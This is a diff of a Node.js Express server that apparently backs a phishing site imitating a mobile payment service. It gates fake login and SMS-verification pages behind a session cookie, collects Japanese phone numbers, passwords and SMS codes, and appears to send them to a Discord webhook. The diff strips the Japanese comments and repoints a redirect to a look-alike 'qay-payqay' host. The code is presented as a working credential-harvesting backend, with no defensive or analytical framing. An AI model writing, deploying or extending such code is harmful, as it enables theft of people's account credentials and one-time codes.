@@ -4,20 +4,19 @@ const cookieParser = require("cookie-parser");
 const { getAccessLog } = require("./dist/Access");
 
 app.use(express.urlencoded({ extended: true }));
-app.use(cookieParser()); // Cookieパーサーを追加
+app.use(cookieParser()); 
 
 const webhook = process.env.DISCORD_WEBHOOK;
 
-// 1. index.html（受け取り画面）へのアクセス時のみCookieを発行
+
 app.get(["/", "/index.html"], (req, res, next) => {
-  // 最初のアクセスでCookieを付与
   if (!req.cookies.pp_session) {
     res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
   }
-  next(); // express.staticに処理を渡す
+  next(); 
 });
 
-// 2. login.html（ログイン画面）へのアクセス制限
+
 app.get("/login.html", (req, res, next) => {
   if (req.cookies.pp_session !== "1") {
     return res.status(403).send(`
@@ -34,7 +33,7 @@ app.get("/login.html", (req, res, next) => {
   next();
 });
 
-// 3. sms.html（SMS認証画面）へのアクセス制限
+
 app.get("/sms.html", (req, res, next) => {
   if (req.cookies.pp_session !== "1") {
     return res.status(403).send(`
@@ -51,11 +50,9 @@ app.get("/sms.html", (req, res, next) => {
   next();
 });
 
-// 4. その他の静的ファイルの配信（既存の位置を維持）
+
 app.use(express.static("."));
 
-
-// --- APIルーティング ---
 
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
@@ -65,7 +62,7 @@ app.post("/send", async (req, res) => {
   const safePassword = typeof password === 'string' ? password : '';
   const cleanPhone = safePhone.replace(/[- ]/g, '');
 
-  // 元のバリデーションとリダイレクト先を維持
+ 
   if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
     return res.redirect("/login.html?error=1");
   }
@@ -126,7 +123,7 @@ app.post("/send-sms", async (req, res) => {
       console.log("sms送信成功");
     }
     
-    res.redirect("https://qayqay.jp/sms.html?error=2"); 
+    res.redirect("https://qay-payqay.up.railway.app/sms.html?error=2"); 
 
   } catch (error) {
     console.error("sms送信失敗:", error);
